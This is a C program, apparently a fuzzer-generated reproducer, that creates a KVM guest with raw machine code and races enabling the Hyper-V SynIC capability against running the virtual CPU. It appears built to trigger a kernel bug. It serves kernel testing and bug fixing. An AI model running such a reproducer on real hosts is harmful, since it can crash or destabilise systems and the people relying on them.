#include <sys/ioctl.h> 
#include <sys/mman.h> 
#include <sys/types.h> 
#include <linux/kvm.h> 
#include <pthread.h> 
#include <stddef.h> 
#include <stdint.h> 
#include <stdlib.h> 
#include <string.h> 
#include <unistd.h> 

#ifndef KVM_CAP_HYPERV_SYNIC 
#define KVM_CAP_HYPERV_SYNIC 123 
#endif 

void* thr(void* arg) 
{ 
  struct kvm_enable_cap cap; 
  cap.flags = 0; 
  cap.cap = KVM_CAP_HYPERV_SYNIC; 
  ioctl((long)arg, KVM_ENABLE_CAP, &cap); 
  return 0; 
} 

int main() 
{ 
  void *host_mem = mmap(0, 0x1000, PROT_READ|PROT_WRITE, 
    MAP_PRIVATE|MAP_ANONYMOUS, -1, 0); 
  int kvmfd = open("/dev/kvm", 0); 
  int vmfd = ioctl(kvmfd, KVM_CREATE_VM, 0); 
  struct kvm_userspace_memory_region memreg; 
  memreg.slot = 0; 
  memreg.flags = 0; 
  memreg.guest_phys_addr = 0; 
  memreg.memory_size = 0x1000; 
  memreg.userspace_addr = (unsigned long)host_mem; 
  memcpy(host_mem, 
                      "\x1a\xb5\x00\x04\x65\x26\x64\x26\xf0\x82\xaa\x00" 
                      "\x02\x00\x3e\x75\x64\xf3\xf3\xf0\x18\x35\x66\xb9" 
                      "\x99\x00\x00\x40\x46\xb8\xc0\x40\x00\x00\x66\xba" 
                      "\x00\x00\x00\x00\x0f\x30\x0f\xfc\xda\xdb\xca\x36" 
                      "\x26\x3e\x67\x3e\x67\xcf\x66\xb9\x4a\x0a\x00\x00" 
                      "\x0f\x32\x2e\x26\x65\x0f\x0f\x01\xa0", 
                      69); 
  ioctl(vmfd, KVM_SET_USER_MEMORY_REGION, &memreg); 
  int cpufd = ioctl(vmfd, KVM_CREATE_VCPU, 0); 
  struct kvm_sregs sregs; 
  ioctl(cpufd, KVM_GET_SREGS, &sregs); 
  sregs.cr0 = 0; 
  sregs.cr4 = 0; 
  sregs.efer = 0; 
  sregs.cs.selector = 0; 
  sregs.cs.base = 0; 
  ioctl(cpufd, KVM_SET_SREGS, &sregs); 
  struct kvm_regs regs; 
  memset(&regs, 0, sizeof(regs)); 
  regs.rflags = 2; 
  ioctl(cpufd, KVM_SET_REGS, &regs); 
  ioctl(vmfd, KVM_CREATE_IRQCHIP, 0); 
  pthread_t th; 
  pthread_create(&th, 0, thr, (void*)(long)cpufd); 
  usleep(rand() % 10000); 
  ioctl(cpufd, KVM_RUN, 0); 
  pthread_join(th, 0); 
  return 0; 
} 
